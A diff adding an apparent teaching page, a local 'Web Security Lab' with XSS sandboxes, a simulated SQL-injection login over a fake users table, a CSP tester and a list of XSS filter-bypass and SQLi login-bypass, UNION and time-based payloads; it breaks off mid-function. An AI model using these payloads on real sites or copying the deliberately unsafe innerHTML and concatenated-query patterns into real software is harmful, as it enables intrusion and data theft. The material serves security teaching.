@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Security Lab — XSS & SQLi</title>
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --border: #30363d;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --green: #3fb950;
+    --red: #f85149;
+    --yellow: #d29922;
+    --blue: #58a6ff;
+    --purple: #bc8cff;
+    --code-bg: #0d1117;
+    --radius: 6px;
+    --font-mono: 'Courier New', Courier, monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+  }
+
+  header {
+    border-bottom: 1px solid var(--border);
+    padding: 16px 24px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    position: sticky;
+    top: 0;
+    background: var(--bg);
+    z-index: 100;
+  }
+
+  header h1 { font-size: 16px; font-weight: 600; }
+  .badge {
+    font-size: 11px;
+    font-family: var(--font-mono);
+    padding: 2px 8px;
+    border-radius: 12px;
+    background: #1a2233;
+    color: var(--blue);
+    border: 1px solid #2d4a7a;
+  }
+  .badge.warn { background: #2a1f0a; color: var(--yellow); border-color: #5a3e10; }
+
+  nav {
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    display: flex;
+    gap: 0;
+  }
+
+  .tab {
+    padding: 10px 16px;
+    cursor: pointer;
+    color: var(--muted);
+    border-bottom: 2px solid transparent;
+    font-size: 13px;
+    font-weight: 500;
+    transition: color .15s;
+    background: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+  }
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--text); border-bottom-color: var(--blue); }
+
+  .page { display: none; padding: 24px; max-width: 960px; margin: 0 auto; }
+  .page.active { display: block; }
+
+  h2 { font-size: 18px; margin-bottom: 4px; }
+  h3 { font-size: 14px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: .04em; margin: 24px 0 10px; }
+
+  .section-desc { color: var(--muted); font-size: 13px; margin-bottom: 20px; }
+
+  .panel {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    overflow: hidden;
+    margin-bottom: 16px;
+  }
+
+  .panel-header {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 8px;
+  }
+
+  .panel-title { font-size: 13px; font-weight: 600; }
+  .panel-body { padding: 14px; }
+
+  input[type=text], textarea, select {
+    width: 100%;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 13px;
+    padding: 8px 10px;
+    outline: none;
+    transition: border-color .15s;
+  }
+  input[type=text]:focus, textarea:focus, select:focus {
+    border-color: var(--blue);
+  }
+  textarea { resize: vertical; min-height: 60px; }
+  select { cursor: pointer; }
+
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 14px;
+    border-radius: var(--radius);
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    border: 1px solid transparent;
+    transition: opacity .15s;
+  }
+  .btn:hover { opacity: .85; }
+  .btn-primary { background: #238636; color: #fff; border-color: #2ea043; }
+  .btn-danger  { background: #da3633; color: #fff; border-color: #f85149; }
+  .btn-muted   { background: var(--surface); color: var(--text); border-color: var(--border); }
+  .btn-blue    { background: #1f6feb; color: #fff; border-color: #388bfd; }
+
+  .row { display: flex; gap: 8px; align-items: flex-end; margin-bottom: 10px; }
+  .row > * { flex: 1; }
+  .row > .btn { flex: 0 0 auto; }
+
+  .output {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 10px 12px;
+    font-family: var(--font-mono);
+    font-size: 13px;
+    min-height: 36px;
+    word-break: break-all;
+    color: var(--green);
+  }
+  .output.html-render {
+    background: #fff;
+    color: #000;
+    font-family: inherit;
+  }
+  .output.error { color: var(--red); }
+  .output.warn  { color: var(--yellow); }
+
+  label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 4px; }
+
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+
+  .chip {
+    display: inline-block;
+    font-size: 11px;
+    font-family: var(--font-mono);
+    padding: 2px 7px;
+    border-radius: 4px;
+    margin: 2px;
+    cursor: pointer;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    color: var(--muted);
+    transition: all .12s;
+  }
+  .chip:hover { border-color: var(--blue); color: var(--blue); }
+
+  .payload-list { display: flex; flex-wrap: wrap; gap: 4px; }
+
+  code {
+    font-family: var(--font-mono);
+    font-size: 12px;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    padding: 1px 5px;
+    color: var(--purple);
+  }
+
+  .tag-safe   { font-size: 11px; padding: 1px 7px; border-radius: 3px; background: #0f2d1a; color: var(--green); border: 1px solid #1e5c30; }
+  .tag-vuln   { font-size: 11px; padding: 1px 7px; border-radius: 3px; background: #2d0f0f; color: var(--red); border: 1px solid #5c1e1e; }
+
+  .result-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 6px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 13px;
+  }
+  .result-row:last-child { border-bottom: none; }
+
+  .db-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--font-mono);
+    font-size: 12px;
+  }
+  .db-table th {
+    text-align: left;
+    padding: 6px 10px;
+    background: #1c2128;
+    color: var(--muted);
+    border-bottom: 1px solid var(--border);
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: .05em;
+  }
+  .db-table td {
+    padding: 6px 10px;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+  }
+  .db-table tr:last-child td { border-bottom: none; }
+  .db-table tr.highlight td { background: #1a2d1a; color: var(--green); }
+  .db-table tr.injected td { background: #2d1a1a; color: var(--red); }
+
+  .notice {
+    background: #1c1a0d;
+    border: 1px solid #5a3e10;
+    border-radius: var(--radius);
+    padding: 10px 14px;
+    color: var(--yellow);
+    font-size: 13px;
+    margin-bottom: 16px;
+  }
+
+  .csp-banner {
+    background: #0d1d2b;
+    border: 1px solid #2d4a7a;
+    border-radius: var(--radius);
+    padding: 10px 14px;
+    color: var(--blue);
+    font-size: 12px;
+    font-family: var(--font-mono);
+    margin-bottom: 16px;
+    word-break: break-all;
+  }
+
+  .divider { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+
+  .context-label {
+    font-size: 11px;
+    font-family: var(--font-mono);
+    color: var(--muted);
+    margin-bottom: 4px;
+  }
+
+  @media (max-width: 640px) {
+    .grid2 { grid-template-columns: 1fr; }
+    header { padding: 12px 16px; }
+    .page { padding: 16px; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>🔬 Web Security Lab</h1>
+  <span class="badge">XSS &amp; SQLi</span>
+  <span class="badge warn">Local only — no real server</span>
+</header>
+
+<nav>
+  <button class="tab active" onclick="switchTab('xss-reflect')">Reflected XSS</button>
+  <button class="tab" onclick="switchTab('xss-dom')">DOM XSS</button>
+  <button class="tab" onclick="switchTab('xss-stored')">Stored XSS</button>
+  <button class="tab" onclick="switchTab('sqli-sim')">SQLi Sim</button>
+  <button class="tab" onclick="switchTab('csp')">CSP</button>
+  <button class="tab" onclick="switchTab('payloads')">Payloads</button>
+</nav>
+
+<!-- ═══════════════════════════════════════════════ REFLECTED XSS ═══ -->
+<div id="tab-xss-reflect" class="page active">
+  <h2>Reflected XSS Sandbox</h2>
+  <p class="section-desc">Input is echoed directly into the page. Toggle between unsafe (raw innerHTML) and safe (textContent) rendering.</p>
+
+  <div class="panel">
+    <div class="panel-header">
+      <span class="panel-title">Simulated URL parameter echo</span>
+      <span id="reflect-mode-badge" class="tag-vuln">VULNERABLE</span>
+    </div>
+    <div class="panel-body">
+      <div class="row">
+        <div>
+          <label>Input (simulates ?q= parameter)</label>
+          <input type="text" id="reflect-input" value="<img src=x onerror=alert('XSS!')>" placeholder="Enter payload…">
+        </div>
+        <button class="btn btn-danger" onclick="runReflected()">Render</button>
+        <button class="btn btn-muted" onclick="toggleReflectMode()">Toggle safe/unsafe</button>
+      </div>
+
+      <div class="context-label">Constructed "URL": <code id="reflect-url-display"></code></div>
+
+      <div style="margin-top:12px">
+        <label>Output (simulated page response)</label>
+        <div id="reflect-output" class="output html-render" style="min-height:60px"></div>
+      </div>
+
+      <div style="margin-top:10px">
+        <label>Rendered source</label>
+        <div id="reflect-source" class="output" style="color:var(--muted)"></div>
+      </div>
+    </div>
+  </div>
+
+  <h3>Quick payloads</h3>
+  <div class="payload-list" id="reflect-payloads"></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ DOM XSS ═══ -->
+<div id="tab-xss-dom" class="page">
+  <h2>DOM-Based XSS</h2>
+  <p class="section-desc">No server round-trip. The payload lives in the URL hash or query string and is read by client-side JS. Choose a DOM source and sink to test.</p>
+
+  <div class="grid2">
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Source</span></div>
+      <div class="panel-body">
+        <label>DOM source</label>
+        <select id="dom-source" onchange="updateDomPreview()">
+          <option value="hash">location.hash</option>
+          <option value="search">location.search</option>
+          <option value="referrer">document.referrer</option>
+          <option value="custom">Custom value</option>
+        </select>
+        <div style="margin-top:10px">
+          <label>Payload</label>
+          <input type="text" id="dom-payload" value="<img src=x onerror=alert('DOM XSS')>" oninput="updateDomPreview()">
+        </div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Sink</span></div>
+      <div class="panel-body">
+        <label>Dangerous sink</label>
+        <select id="dom-sink" onchange="updateDomPreview()">
+          <option value="innerHTML">element.innerHTML</option>
+          <option value="write">document.write()</option>
+          <option value="eval">eval()</option>
+          <option value="href">a.href (javascript:)</option>
+        </select>
+        <div style="margin-top:10px">
+          <label>Safe alternative</label>
+          <div style="padding:8px 10px;background:var(--code-bg);border:1px solid var(--border);border-radius:var(--radius);font-family:var(--font-mono);font-size:12px;color:var(--green)" id="dom-safe-alt">textContent</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header">
+      <span class="panel-title">Generated vulnerable code</span>
+    </div>
+    <div class="panel-body">
+      <div class="output" id="dom-code-preview" style="color:var(--purple);white-space:pre-wrap;font-size:12px"></div>
+      <div style="margin-top:10px;display:flex;gap:8px">
+        <button class="btn btn-danger" onclick="executeDomXss()">Execute (unsafe)</button>
+        <button class="btn btn-primary" onclick="executeDomSafe()">Execute (safe)</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">Render output</span></div>
+    <div class="panel-body">
+      <div id="dom-output" class="output html-render" style="min-height:50px"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ STORED XSS ═══ -->
+<div id="tab-xss-stored" class="page">
+  <h2>Stored XSS Simulator</h2>
+  <p class="section-desc">Posts are "saved" in memory and re-rendered for every viewer. Stored payloads fire each time the page loads.</p>
+
+  <div class="grid2">
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title">Submit a comment</span>
+        <span id="stored-mode-badge" class="tag-vuln">VULNERABLE</span>
+      </div>
+      <div class="panel-body">
+        <div style="margin-bottom:10px">
+          <label>Username</label>
+          <input type="text" id="stored-user" value="attacker" placeholder="Username">
+        </div>
+        <div style="margin-bottom:10px">
+          <label>Comment</label>
+          <textarea id="stored-comment" placeholder="Try: &lt;script&gt;alert('stored XSS')&lt;/script&gt;"><img src=x onerror="alert('Stored XSS fired!')"></textarea>
+        </div>
+        <div style="display:flex;gap:8px">
+          <button class="btn btn-danger" onclick="submitComment(false)">Submit (unsafe)</button>
+          <button class="btn btn-primary" onclick="submitComment(true)">Submit (safe)</button>
+          <button class="btn btn-muted" onclick="clearComments()">Clear all</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Comment feed (re-renders stored content)</span></div>
+      <div class="panel-body" id="comment-feed" style="min-height:100px">
+        <span style="color:var(--muted);font-size:13px">No comments yet.</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ SQLI ═══ -->
+<div id="tab-sqli-sim" class="page">
+  <h2>SQL Injection Simulator</h2>
+  <p class="section-desc">A simulated in-memory "database" with a fake login and search query. Watch how payloads alter the constructed SQL.</p>
+
+  <div class="notice">⚡ This is a JavaScript simulation — no real database. It mimics SQL parsing logic to show what would happen server-side.</div>
+
+  <div class="grid2">
+    <div>
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">Fake Users Table</span></div>
+        <div class="panel-body" style="padding:0">
+          <table class="db-table" id="db-preview"></table>
+        </div>
+      </div>
+    </div>
+    <div>
+      <div class="panel">
+        <div class="panel-header"><span class="panel-title">Login form</span></div>
+        <div class="panel-body">
+          <label>Username</label>
+          <input type="text" id="sqli-user" value="admin" style="margin-bottom:10px">
+          <label>Password</label>
+          <input type="text" id="sqli-pass" value="wrongpass" style="margin-bottom:10px">
+          <button class="btn btn-danger" onclick="runSqliLogin(false)">Login (vulnerable)</button>
+          <button class="btn btn-primary" onclick="runSqliLogin(true)" style="margin-left:8px">Login (safe)</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel" style="margin-top:0">
+    <div class="panel-header"><span class="panel-title">Constructed query</span></div>
+    <div class="panel-body">
+      <div class="output" id="sqli-query" style="white-space:pre-wrap;color:var(--purple)"></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">Query result</span></div>
+    <div class="panel-body" style="padding:0">
+      <table class="db-table" id="sqli-result-table">
+        <tr><td style="padding:14px;color:var(--muted)">Run a query above.</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <hr class="divider">
+  <h2>UNION / Blind SQLi</h2>
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">Search endpoint</span></div>
+    <div class="panel-body">
+      <div class="row">
+        <div>
+          <label>Search term (simulates /search?q=…)</label>
+          <input type="text" id="sqli-search" value="alice" placeholder="Try: ' OR 1=1 --">
+        </div>
+        <button class="btn btn-danger" onclick="runSqliSearch(false)">Search (unsafe)</button>
+        <button class="btn btn-primary" onclick="runSqliSearch(true)">Search (safe)</button>
+      </div>
+      <div style="margin-top:10px">
+        <label>Query</label>
+        <div class="output" id="sqli-search-query" style="color:var(--purple)"></div>
+      </div>
+      <div style="margin-top:10px;padding:0;background:var(--code-bg);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden">
+        <table class="db-table" id="sqli-search-result"></table>
+      </div>
+    </div>
+  </div>
+
+  <h3>Quick payloads</h3>
+  <div class="payload-list" id="sqli-payloads"></div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ CSP ═══ -->
+<div id="tab-csp" class="page">
+  <h2>Content Security Policy Tester</h2>
+  <p class="section-desc">CSP is the browser-side defense against XSS. Build a policy and see which payloads it would block or allow.</p>
+
+  <div class="grid2">
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Policy builder</span></div>
+      <div class="panel-body">
+        <div style="margin-bottom:10px">
+          <label>script-src</label>
+          <select id="csp-script-src" onchange="updateCspPreview()">
+            <option value="'self'">self (same-origin scripts only)</option>
+            <option value="'self' 'unsafe-inline'">'self' + unsafe-inline ⚠️</option>
+            <option value="'self' 'unsafe-eval'">'self' + unsafe-eval ⚠️</option>
+            <option value="'none'">none (block all scripts)</option>
+            <option value="*">* (allow everything 🚨)</option>
+          </select>
+        </div>
+        <div style="margin-bottom:10px">
+          <label>default-src</label>
+          <select id="csp-default-src" onchange="updateCspPreview()">
+            <option value="'self'">'self'</option>
+            <option value="'none'">'none'</option>
+            <option value="*">*</option>
+          </select>
+        </div>
+        <div>
+          <label>img-src</label>
+          <select id="csp-img-src" onchange="updateCspPreview()">
+            <option value="'self'">'self'</option>
+            <option value="*">* (allow all images)</option>
+            <option value="'none'">'none'</option>
+          </select>
+        </div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><span class="panel-title">Generated header</span></div>
+      <div class="panel-body">
+        <div class="csp-banner" id="csp-preview"></div>
+        <label style="margin-top:10px">Nonce (add to allow specific inline scripts)</label>
+        <div style="display:flex;gap:8px;align-items:center">
+          <input type="text" id="csp-nonce" readonly style="flex:1">
+          <button class="btn btn-muted" onclick="genNonce()">Regen</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <div class="panel-header"><span class="panel-title">Payload checker — would this CSP block it?</span></div>
+    <div class="panel-body">
+      <div class="row">
+        <div>
+          <label>Payload</label>
+          <input type="text" id="csp-payload" value="<script>alert(1)</script>">
+        </div>
+        <button class="btn btn-blue" onclick="checkCsp()">Check</button>
+      </div>
+      <div id="csp-result" class="output" style="margin-top:10px"></div>
+    </div>
+  </div>
+
+  <h3>Common CSP weaknesses</h3>
+  <div class="panel">
+    <div class="panel-body" style="padding:0">
+      <div class="result-row" style="padding:8px 14px">
+        <span><code>unsafe-inline</code></span>
+        <span style="color:var(--red);font-size:12px">Allows inline &lt;script&gt; tags and event handlers</span>
+      </div>
+      <div class="result-row" style="padding:8px 14px">
+        <span><code>unsafe-eval</code></span>
+        <span style="color:var(--red);font-size:12px">Allows eval(), setTimeout(string), Function()</span>
+      </div>
+      <div class="result-row" style="padding:8px 14px">
+        <span><code>script-src *</code></span>
+        <span style="color:var(--red);font-size:12px">Allows scripts from any domain</span>
+      </div>
+      <div class="result-row" style="padding:8px 14px">
+        <span><code>Missing default-src</code></span>
+        <span style="color:var(--yellow);font-size:12px">Falls back to browser default (permissive)</span>
+      </div>
+      <div class="result-row" style="padding:8px 14px">
+        <span><code>nonce= (correct)</code></span>
+        <span style="color:var(--green);font-size:12px">Only nonce-matched scripts run — gold standard</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════ PAYLOADS ═══ -->
+<div id="tab-payloads" class="page">
+  <h2>Payload Reference</h2>
+  <p class="section-desc">Click any payload to copy. These are for use in your own authorized test environments.</p>
+
+  <h3>XSS — Basic</h3>
+  <div class="panel">
+    <div class="panel-body" id="payload-xss-basic"></div>
+  </div>
+
+  <h3>XSS — Filter bypasses</h3>
+  <div class="panel">
+    <div class="panel-body" id="payload-xss-bypass"></div>
+  </div>
+
+  <h3>SQLi — Login bypass</h3>
+  <div class="panel">
+    <div class="panel-body" id="payload-sqli-login"></div>
+  </div>
+
+  <h3>SQLi — UNION / enumeration</h3>
+  <div class="panel">
+    <div class="panel-body" id="payload-sqli-union"></div>
+  </div>
+
+  <h3>SQLi — Blind / time-based</h3>
+  <div class="panel">
+    <div class="panel-body" id="payload-sqli-blind"></div>
+  </div>
+
+  <div id="copy-toast" style="
+    position:fixed;bottom:24px;right:24px;
+    background:#238636;color:#fff;
+    padding:8px 16px;border-radius:var(--radius);
+    font-size:13px;opacity:0;transition:opacity .2s;
+    pointer-events:none;
+  ">Copied!</div>
+</div>
+
+<script>
+// ─── state ───────────────────────────────────────────────────────────────────
+let reflectSafe = false;
+let storedComments = [];
+let cspNonce = '';
+
+// ─── payload data ─────────────────────────────────────────────────────────────
+const PAYLOADS = {
+  xssBasic: [
+    `<script>alert('XSS')<\/script>`,
+    `<img src=x onerror=alert(1)>`,
+    `<svg onload=alert(1)></svg>`,
+    `<input autofocus onfocus=alert(1)>`,
+    `<details open ontoggle=alert(1)>`,
+    `<a href="javascript:alert(1)">click</a>`,
+    `<body onload=alert(1)>`,
+    `<video src=x onerror=alert(1)></video>`,
+    `<iframe srcdoc="<script>alert(1)<\/script>"></iframe>`,
+  ],
+  xssBypass: [
+    `<ScRiPt>alert(1)</sCrIpT>`,
+    `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">`,
+    `"><script>alert(1)<\/script>`,
+    `" onmouseover="alert(1)`,
+    `<script>eval('al'+'ert(1)')<\/script>`,
+    `<script>eval(atob('YWxlcnQoMSk='))<\/script>`,
+    `<svg/onload=alert(1)`,
+    `<img src=x	onerror=alert(1)>`,
+  ],
+  sqliLogin: [
+    `' OR '1'='1`,
+    `' OR 1=1 --`,
+    `admin' --`,
+    `' OR 'x'='x`,
+    `') OR ('1'='1`,
+    `1' OR '1'='1' --`,
+  ],
+  sqliUnion: [
+    `' UNION SELECT 1,2,3 --`,
+    `' UNION SELECT username,password,3 FROM users --`,
+    `' ORDER BY 3 --`,
+    `' AND 1=0 UNION SELECT null,null,null --`,
+  ],
+  sqliBlind: [
+    `' AND 1=1 --`,
+    `' AND 1=2 --`,
+    `' AND SLEEP(5) --`,
+    `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 --`,
+    `'; WAITFOR DELAY '0:0:5' --`,
+  ],
+};
+
+// ─── fake db ─────────────────────────────────────────────────────────────────
+const DB = [
+  { id: 1, username: 'admin',   password: 'hunter2',   role: 'admin' },
+  { id: 2, username: 'alice',   password: 'alice123',  role: 'user'  },
+  { id: 3, username: 'bob',     password: 'qwerty',    role: 'user'  },
+  { id: 4, username: 'charlie', password: 'ch4rl1e',   role: 'mod'   },
+];
+
+// ─── tabs ─────────────────────────────────────────────────────────────────────
+function switchTab(id) {
+  document.querySelectorAll('.tab').forEach((t, i) => {
+    const ids = ['xss-reflect','xss-dom','xss-stored','sqli-sim','csp','payloads'];
+    t.classList.toggle('active', ids[i] === id);
+  });
+  document.querySelectorAll('.page').forEach(p => {
+    p.classList.toggle('active', p.id === 'tab-' + id);
+  });
+}
+
+// ─── reflected xss ──────────────────────────────────────────────────────────
+function runReflected() {
+  const val = document.getElementById('reflect-input').value;
+  const out = document.getElementById('reflect-output');
+  const src = document.getElementById('reflect-source');
+  document.getElementById('reflect-url-display').textContent =
+    `https://example.com/search?q=${encodeURIComponent(val)}`;
+  if (reflectSafe) {
+    out.textContent = val; // safe
+    src.textContent = 'Rendered as: textContent (escaped)';
+  } else {
+    out.innerHTML = val; // vulnerable
+    src.textContent = 'Rendered as: innerHTML = "' + val.replace(/</g,'&lt;') + '"';
+  }
+}
+
+function toggleReflectMode() {
+  reflectSafe = !reflectSafe;
+  const b = document.getElementById('reflect-mode-badge');
+  b.textContent = reflectSafe ? 'SAFE' : 'VULNERABLE';
+  b.className = reflectSafe ? 'tag-safe' : 'tag-vuln';
+}
+
+// ─── dom xss ─────────────────────────────────────────────────────────────────
+const DOM_SINKS = {
+  innerHTML: {
+    code: (src, p) => `// Source: ${src}\nconst data = ${src};\ndiv.innerHTML = data; // DANGEROUS`,
+    safe: 'element.textContent = data',
+    exec: (p) => { document.getElementById('dom-output').innerHTML = p; },
+    safeExec: (p) => { document.getElementById('dom-output').textContent = p; },
+  },
+  write: {
+    code: (src, p) => `// Source: ${src}\nconst data = ${src};\ndocument.write(data); // DANGEROUS`,
+    safe: 'element.textContent = data',
+    exec: (p) => { document.getElementById('dom-output').innerHTML = p; },
+    safeExec: (p) => { document.getElementById('dom-output').textContent = p; },
+  },
+  eval: {
+    code: (src, p) => `// Source: ${src}\nconst data = ${src};\neval(data); // DANGEROUS`,
+    safe: 'JSON.parse() with schema validation',
+    exec: (p) => { document.getElementById('dom-output').textContent = '[eval() blocked in sandbox — payload: ' + p + ']'; },
+    safeExec: (p) => { document.getElementById('dom-output').textContent = 'Safe: skipped eval — data: ' + p; },
+  },
+  href: {
+    code: (src, p) => `// Source: ${src}\nconst data = ${src};\nanchor.href = data; // DANGEROUS if javascript:`,
+    safe: "Validate href doesn't start with javascript:",
+    exec: (p) => {
+      document.getElementById('dom-output').innerHTML =
+        `<a href="${p}" style="color:var(--red)">Link (hover to see href)</a> — check href: ${p}`;
+    },
+    safeExec: (p) => {
+      const safe = p.toLowerCase().startsWith('javascript:') ? '#' : p;
+      document.getElementById('dom-output').innerHTML =
+        `<a href="${safe}" style="color:var(--green)">Link (sanitized)</a> — href: ${safe}`;
+    },
+  },
+};
+
+function updateDomPreview() {
+  const sink = document.getElementById('dom-sink').value;
+  const src  = document.getElementById('dom-source').value;
+  const payload = document.getElementById('dom-payload').value;
+  const srcStr = {
+    hash: 'location.hash.slice(1)',
+    search: 'new URLSearchParams(location.search).get("q")',
+    referrer: 'document.referrer',
+    custom: '"' + payload + '"',
+  }[src];
+  document.getElementById('dom-code-preview').textContent = DOM_SINKS[sink].code(srcStr, payload);
+  document.getElementById('dom-safe-alt').textContent = DOM_SINKS[sink].safe;
+}
+
+function executeDomXss() {
+  const sink = document.getElementById('dom-sink').value;
+  const payload = document.getElementById('dom-payload').value;
+  DOM_SINKS[sink].exec(payload);
+}
+
+function executeDomSafe() {
+  const sink = document.getElementById('dom-sink').value;
+  const payload = document.getElementById('dom-payload').value;
+  DOM_SINKS[sink].safeExec(payload);
+}
+
+// ─── stored xss ──────────────────────────────────────────────────────────────
+function submitComment(safe) {
+  const user    = document.getElementById('stored-user').value || 'anon';
+  const comment = document.getElementById('stored-comment').value;
+  storedComments.push({ user, comment, safe });
+  renderComments();
+}
+
+function renderComments() {
+  const feed = document.getElementById('comment-feed');
+  if (!storedComments.length) {
+    feed.innerHTML = '<span style="color:var(--muted);font-size:13px">No comments yet.</span>';
+    return;
+  }
+  feed.innerHTML = storedComments.map((c, i) => {
+    const badge = c.safe
+      ? '<span class="tag-safe">safe</span>'
+      : '<span class="tag-vuln">unsafe</span>';
+    const content = c.safe
+      ? `<span>${escapeHtml(c.comment)}</span>`
+      : `<span>${c.comment}</span>`;
+    return `<div style="border-bottom:1px solid var(--border);padding:10px 0;last-child{border:0}">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
+        <strong style="font-size:13px">${escapeHtml(c.user)}</strong>${badge}
+        <span style="font-size:11px;color:var(--muted)">#${i+1}</span>
+      </div>
+      <div style="font-size:13px">${content}</div>
+    </div>`;
+  }).join('');
+}
+
+function clearComments() {
+  storedComments = [];
+  renderComments();
+}
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+          .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+
+// ─── sqli sim ────────────────────────────────────────────────────────────────
+function renderDbTable() {
+  const t = document.getElementById('db-preview');
+  t.innerHTML = `<tr>${['id','username','password','role'].map(h=>`<th>${h}</th>`).join('')}</tr>` +
+    DB.map(r=>`<tr><td>${r.id}</td><td>${r.username}</td><td>${r.password}</td><td>${r.role}</td></tr>`).join('');
+}
+
+// Simulated SQL engine
+function simSqlLogin(user, pass, safe) {
+  let query, matched;
+  if (safe) {
+    query = `SELECT * FROM users\nWHERE username = ? AND password = ?\n-- [parameterized]`;
+    matched = DB.filter(r => r.username === user && r.password === pass);
+  } else {
+    query = `SELECT * FROM users\nWHERE username = '${user}' AND password = '${pass}'`;
+    // naive eval: check for OR 1=1 type patterns
+    const u = user.toLowerCase();
+    const p = pass.toLowerCase();
+    const alwaysTrue = u.includes("' or") || u.includes("'or") || u.includes('-- ') || u.endsWith("--") ||
+                       p.includes("' or") || p.includes("'or");
+    if (alwaysTrue) {
+      matched = DB; // returns all rows — auth bypass!
+    } else if (u.endsWith("'--") || u.endsWith("' --")) {
+      // comment out password check
+      const uname = user.replace(/'.*/, '').trim();
+      matched = DB.filter(r => r.username === uname);
+    } else {
+      matched = DB.filter(r => r.username === user && r.password === pass);
+    }
+  }
+  return { query, matched };
+}
+
+function runSqliLogin(safe) {
+  const user = document.getElementById('sqli-user').value;
+  const pass = document.getElementById('sqli-pass').value;
+  const { query, matched } = simSqlLogin(user, pass, safe);
+  document.getElementById('sqli-query').textContent = query;
+  renderSqliResult(matched, matched.length ? (matched.length > 1 ? 'injected' : 'highlight') : '');
+}
+
+function renderSqliResult(rows, cls) {
+  const t = document.getElementById('sqli-result-table');
+  if (!rows.length) {
+    t.innerHTML = `<tr><td style="padding:12px 14px;color:var(--red)">❌ No rows returned — login failed</td></tr>`;
+    return;
+  }
+  t.innerHTML = `
+    <tr><td colspan="4" style="padding:6px 14px;color:${cls==='injected'?'var(--red)':'var(--green)'};font-size:12px">
+      ${cls==='injected' ? `⚠️ Injection returned ${rows.length} row(s) — auth bypassed!` : '✅ Login successful'}
+    </td></tr>` +
+    `<tr>${['id','username','password','role'].map(h=>`<th>${h}</th>`).join('')}</tr>` +
+    rows.map(r=>`<tr class="${cls}"><td>${r.id}</td><td>${r.username}</td><td>${r.password}</td><td>${r.role}</td></tr>`).join('');
+}
+
+function runSqliSearch(safe) {
+  const term = document.getElementById('sqli-search').value;
+  let query, matched;
+  if (safe) {
+    query = `SELECT * FROM users WHERE username LIKE ? -- [parameterized: '%${term}%']`;
+    matched = DB.filter(r => r.username.includes(term));
+  } else {
+    query = `SELECT * FROM users WHERE username LIKE '%${term}%'`;
+    const t = term.toLowerCase();
+    if (t.includes("' or 1=1") || t.includes("'or 1=1") || t === "' or '1'='1") {
+      matched = DB;
+    } else if (t.includes("union select")) {
+      matched = [{ id: '@@version', username: 'MySQL 8.0.33', password: 'information_schema', role: '(exfiltrated via UNION)' }];
+    } else {
+      matched = DB.filter(r => r.username.toLowerCase().includes(t));
+    }
+  }
+  document.getElementById('sqli-search-query').textContent = query;
+  const t = document.getElementById('sqli-search-result');
+  if (!matched.length) {
+    t.innerHTML = `<tr><td style="padding:10px 14px;color:var(--muted)">No results.</td></tr>`;
+    return;
+  }
+  const isInjected = !safe && (term.toLowerCase().includes("' or") || term.toLowerCase().includes("union"));
+  t.innerHTML = `<tr>${['id','username','password','role'].map(h=>`<th>${h}</th>`).join('')}</tr>` +
